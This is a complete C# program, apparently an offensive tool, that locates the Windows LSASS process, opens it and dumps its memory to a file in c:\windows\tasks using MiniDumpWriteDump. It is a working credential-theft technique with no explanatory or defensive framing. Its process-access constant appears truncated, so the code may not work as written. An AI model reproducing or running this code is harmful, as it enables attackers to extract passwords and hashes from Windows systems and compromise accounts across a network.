using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace SharpCustomMiniDump
{
     class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            int ProcessId, 
            IntPtr hFile, 
            int DumpType, 
            IntPtr ExceptionParam,
            IntPtr UserStreamParam, 
            IntPtr CallbackParam);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("c:\\windows\\tasks\\lsass.dmp", FileMode.Create);

            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
